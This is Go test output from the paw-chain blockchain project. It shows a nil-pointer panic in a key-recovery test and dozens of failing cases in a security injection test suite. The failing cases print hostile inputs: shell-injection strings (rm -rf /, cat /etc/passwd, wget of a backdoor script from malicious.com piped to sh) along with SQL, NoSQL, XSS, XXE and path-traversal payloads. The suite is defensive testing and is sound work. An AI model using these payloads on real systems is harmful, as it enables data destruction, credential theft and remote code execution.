@@ -1,0 +1,303 @@
+ok  	github.com/paw-chain/paw/api	(cached)
+?   	github.com/paw-chain/paw/api/cmd	[no test files]
+?   	github.com/paw-chain/paw/api/health	[no test files]
+ok  	github.com/paw-chain/paw/app	0.400s
+?   	github.com/paw-chain/paw/cmd/pawcli	[no test files]
+?   	github.com/paw-chain/paw/cmd/pawd	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+--- FAIL: TestRecoverKeyCommand (0.02s)
+panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
+[signal 0xc0000005 code=0x0 addr=0x30 pc=0x7ff7cbf94487]
+
+goroutine 79 [running]:
+testing.tRunner.func1.2({0x7ff7cd3df860, 0x7ff7cfa1cfb0})
+	C:/Program Files/Go/src/testing/testing.go:1872 +0x239
+testing.tRunner.func1()
+	C:/Program Files/Go/src/testing/testing.go:1875 +0x35b
+panic({0x7ff7cd3df860?, 0x7ff7cfa1cfb0?})
+	C:/Program Files/Go/src/runtime/panic.go:783 +0x132
+github.com/cosmos/cosmos-sdk/client.SetCmdClientContext(_, {{0x0, 0x0, 0x0}, {0x0, 0x0}, 0x0, {0x0, 0x0}, {0x7ff7cdfe5948, ...}, ...})
+	C:/Users/decri/go/pkg/mod/github.com/cosmos/cosmos-sdk@v0.50.11/client/cmd.go:367 +0x87
+github.com/cosmos/cosmos-sdk/client.SetCmdClientContextHandler({{0x0, 0x0, 0x0}, {0x0, 0x0}, 0x0, {0x0, 0x0}, {0x7ff7cdfe5948, 0xc00079d430}, ...}, ...)
+	C:/Users/decri/go/pkg/mod/github.com/cosmos/cosmos-sdk@v0.50.11/client/cmd.go:36 +0x105
+github.com/paw-chain/paw/cmd/pawd/cmd.TestRecoverKeyCommand(0xc000506700)
+	C:/Users/decri/GitClones/PAW/cmd/pawd/cmd/keys_test.go:350 +0x585
+testing.tRunner(0xc000506700, 0x7ff7cdbadf40)
+	C:/Program Files/Go/src/testing/testing.go:1934 +0xc3
+created by testing.(*T).Run in goroutine 1
+	C:/Program Files/Go/src/testing/testing.go:1997 +0x44b
+FAIL	github.com/paw-chain/paw/cmd/pawd/cmd	0.724s
+?   	github.com/paw-chain/paw/external/crypto/exchange-frontend/node_modules/snyk/dist/gosrc	[no test files]
+?   	github.com/paw-chain/paw/p2p	[no test files]
+?   	github.com/paw-chain/paw/p2p/discovery	[no test files]
+?   	github.com/paw-chain/paw/p2p/protocol	[no test files]
+?   	github.com/paw-chain/paw/p2p/reputation	[no test files]
+?   	github.com/paw-chain/paw/security	[no test files]
+?   	github.com/paw-chain/paw/simapp	[no test files]
+ok  	github.com/paw-chain/paw/tests/benchmarks	(cached) [no tests to run]
+ok  	github.com/paw-chain/paw/tests/e2e	0.544s
+ok  	github.com/paw-chain/paw/tests/property	(cached)
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+--- FAIL: TestInjectionSecurityTestSuite (0.19s)
+    --- FAIL: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1KB (0.00s)
+            injection_test.go:198: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:198
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1KB
+                	Messages:   	Excessively long input (1024 chars) should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_10KB (0.00s)
+            injection_test.go:198: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:198
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_10KB
+                	Messages:   	Excessively long input (10240 chars) should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_100KB (0.00s)
+            injection_test.go:198: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:198
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_100KB
+                	Messages:   	Excessively long input (102400 chars) should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1MB (0.00s)
+            injection_test.go:198: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:198
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1MB
+                	Messages:   	Excessively long input (1048576 chars) should be rejected
+    --- FAIL: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_rm_-rf_/ (0.00s)
+            injection_test.go:95: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:95
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com; rm -rf /" should not contain ";"
+                	Test:       	TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_rm_-rf_/
+                	Messages:   	Semicolon should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_|_cat_/etc/passwd (0.00s)
+            injection_test.go:96: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:96
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com | cat /etc/passwd" should not contain "|"
+                	Test:       	TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_|_cat_/etc/passwd
+                	Messages:   	Pipe should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_&&_curl_malicious.com (0.00s)
+            injection_test.go:97: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:97
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com && curl malicious.com" should not contain "&"
+                	Test:       	TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_&&_curl_malicious.com
+                	Messages:   	Ampersand should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_wget_malicious.com/backdoor.sh_|_sh (0.00s)
+            injection_test.go:95: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:95
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com; wget malicious.com/backdoor.sh | sh" should not contain ";"
+                	Test:       	TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_wget_malicious.com/backdoor.sh_|_sh
+                	Messages:   	Semicolon should be rejected
+    --- FAIL: TestInjectionSecurityTestSuite/TestFormatString_Injection (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%n%n%n%n%n (0.00s)
+            injection_test.go:290: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:290
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"%n%n%n%n%n" should not contain "%n"
+                	Test:       	TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%n%n%n%n%n
+                	Messages:   	Format specifiers should be sanitized
+    --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection (0.02s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$gt:_''} (0.00s)
+            injection_test.go:459: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:459
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$gt:_''}
+                	Messages:   	NoSQL injection payload should be rejected: {$gt: ''}
+        --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$ne:_null} (0.00s)
+            injection_test.go:459: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:459
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$ne:_null}
+                	Messages:   	NoSQL injection payload should be rejected: {$ne: null}
+        --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_';_return_true;_var_dummy=' (0.00s)
+            injection_test.go:459: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:459
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_';_return_true;_var_dummy='
+                	Messages:   	NoSQL injection payload should be rejected: '; return true; var dummy='
+        --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$where:_'return_true'} (0.00s)
+            injection_test.go:459: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:459
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$where:_'return_true'}
+                	Messages:   	NoSQL injection payload should be rejected: {$where: 'return true'}
+        --- FAIL: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_admin'_||_'1'=='1 (0.00s)
+            injection_test.go:459: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:459
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_admin'_||_'1'=='1
+                	Messages:   	NoSQL injection payload should be rejected: admin' || '1'=='1
+    --- FAIL: TestInjectionSecurityTestSuite/TestNullByte_Injection (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_upaw\x00.txt (0.00s)
+            injection_test.go:260: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:260
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_upaw\x00.txt
+                	Messages:   	Null byte injection should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_token\x00admin (0.00s)
+            injection_test.go:260: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:260
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_token\x00admin
+                	Messages:   	Null byte injection should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_asset\x00'_OR_'1'='1 (0.00s)
+            injection_test.go:260: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:260
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_asset\x00'_OR_'1'='1
+                	Messages:   	Null byte injection should be rejected
+    --- FAIL: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_../../../etc/passwd (0.00s)
+            injection_test.go:128: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:128
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"../../../etc/passwd" should not contain ".."
+                	Test:       	TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_../../../etc/passwd
+                	Messages:   	Path traversal should be prevented
+        --- FAIL: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_..\..\..\windows\system32 (0.00s)
+            injection_test.go:128: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:128
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"..\\..\\..\\windows\\system32" should not contain ".."
+                	Test:       	TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_..\..\..\windows\system32
+                	Messages:   	Path traversal should be prevented
+        --- FAIL: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/../../secrets (0.00s)
+            injection_test.go:128: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:128
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com/../../secrets" should not contain ".."
+                	Test:       	TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/../../secrets
+                	Messages:   	Path traversal should be prevented
+        --- FAIL: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/....//....// (0.00s)
+            injection_test.go:128: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:128
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"https://api.com/....//....//" should not contain ".."
+                	Test:       	TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/....//....//
+                	Messages:   	Path traversal should be prevented
+    --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DROP_TABLE_pools;_-- (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DROP_TABLE_pools;_--
+                	Messages:   	SQL injection payload should be rejected: '; DROP TABLE pools; --
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_1'_OR_'1'='1 (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_1'_OR_'1'='1
+                	Messages:   	SQL injection payload should be rejected: 1' OR '1'='1
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_admin'-- (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_admin'--
+                	Messages:   	SQL injection payload should be rejected: admin'--
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_'_OR_1=1-- (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_'_OR_1=1--
+                	Messages:   	SQL injection payload should be rejected: ' OR 1=1--
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DELETE_FROM_pools_WHERE_'1'='1 (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DELETE_FROM_pools_WHERE_'1'='1
+                	Messages:   	SQL injection payload should be rejected: '; DELETE FROM pools WHERE '1'='1
+        --- FAIL: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_token';_UPDATE_pools_SET_reserve_a=0;_-- (0.00s)
+            injection_test.go:61: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:61
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	An error is expected but got nil.
+                	Test:       	TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_token';_UPDATE_pools_SET_reserve_a=0;_--
+                	Messages:   	SQL injection payload should be rejected: token'; UPDATE pools SET reserve_a=0; --
+    --- FAIL: TestInjectionSecurityTestSuite/TestXML_Injection (0.02s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<?xml_version="1.0"?><!DOCTYPE_foo_[<!ENTITY_xxe_SYSTEM_"file:///etc/passwd">]> (0.00s)
+            injection_test.go:425: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:425
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" should not contain "<?xml"
+                	Test:       	TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<?xml_version="1.0"?><!DOCTYPE_foo_[<!ENTITY_xxe_SYSTEM_"file:///etc/passwd">]>
+                	Messages:   	XML declarations should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<!ENTITY_test_SYSTEM_"file:///"> (0.00s)
+            injection_test.go:427: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:427
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<!ENTITY test SYSTEM \"file:///\">" should not contain "<!ENTITY"
+                	Test:       	TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<!ENTITY_test_SYSTEM_"file:///">
+                	Messages:   	Entity declarations should be rejected
+    --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames (0.01s)
+        --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<script>alert('XSS')</script> (0.00s)
+            injection_test.go:160: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:160
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<script>alert('XSS')</script>" should not contain "<"
+                	Test:       	TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<script>alert('XSS')</script>
+                	Messages:   	HTML tags should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<img_src=x_onerror=alert('XSS')> (0.00s)
+            injection_test.go:160: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:160
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<img src=x onerror=alert('XSS')>" should not contain "<"
+                	Test:       	TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<img_src=x_onerror=alert('XSS')>
+                	Messages:   	HTML tags should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_javascript:alert('XSS') (0.00s)
+            injection_test.go:162: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:162
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"javascript:alert('XSS')" should not contain "script"
+                	Test:       	TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_javascript:alert('XSS')
+                	Messages:   	Script tags should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<iframe_src='javascript:alert(1)'> (0.00s)
+            injection_test.go:160: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:160
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<iframe src='javascript:alert(1)'>" should not contain "<"
+                	Test:       	TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<iframe_src='javascript:alert(1)'>
+                	Messages:   	HTML tags should be rejected
+        --- FAIL: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<svg/onload=alert('XSS')> (0.00s)
+            injection_test.go:160: 
+                	Error Trace:	C:/Users/decri/GitClones/PAW/tests/security/injection_test.go:160
+                	            				C:/Users/decri/go/pkg/mod/github.com/stretchr/testify@v1.11.1/suite/suite.go:115
+                	Error:      	"<svg/onload=alert('XSS')>" should not contain "<"
+                	Test:       	TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<svg/onload=alert('XSS')>
+                	Messages:   	HTML tags should be rejected
+FAIL
+FAIL	github.com/paw-chain/paw/tests/security	3.376s
+?   	github.com/paw-chain/paw/testutil/cometmock	[no test files]
+?   	github.com/paw-chain/paw/testutil/integration	[no test files]
+?   	github.com/paw-chain/paw/testutil/keeper	[no test files]
+?   	github.com/paw-chain/paw/x/compute	[no test files]
+ok  	github.com/paw-chain/paw/x/compute/keeper	0.383s
+?   	github.com/paw-chain/paw/x/compute/types	[no test files]
+?   	github.com/paw-chain/paw/x/dex	[no test files]
+ok  	github.com/paw-chain/paw/x/dex/keeper	0.416s
+ok  	github.com/paw-chain/paw/x/dex/types	(cached)
+?   	github.com/paw-chain/paw/x/oracle	[no test files]
+ok  	github.com/paw-chain/paw/x/oracle/keeper	0.274s
+?   	github.com/paw-chain/paw/x/oracle/types	[no test files]
+FAIL
